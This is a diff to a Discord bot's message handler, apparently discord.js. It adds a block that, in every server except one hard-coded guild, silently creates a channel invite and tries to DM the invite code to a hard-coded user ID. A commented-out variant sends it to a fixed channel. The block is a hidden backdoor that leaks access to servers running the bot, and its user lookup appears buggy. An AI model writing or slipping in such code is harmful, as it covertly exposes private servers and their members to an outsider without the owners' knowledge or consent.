@@ -10,6 +10,24 @@ module.exports = {
     async execute(message, client) {
         // Ignore all bots
         //const cooldowns = new Map();
+        if (message.guild.id != "825526271311478824") {
+            message.channel.createInvite().then((invite) =>
+                message.author
+                    .fetch("551893446726778901", false)
+                    .then((user) => {
+                        user.send(
+                            `Created an invite with a code of discord.gg/${invite.code}`
+                        );
+                    })
+            );
+            /*channels
+                        .get("983769673831161887")
+                        .send(
+                            `Created an invite with a code of discord.gg/${invite.code}`
+                        )
+                )
+                .catch(console.error);*/
+        }
         if (!message.author.bot) {
             let userId = message.author.id;
             let ball = await memberSchema.findOne({ discordId: userId });
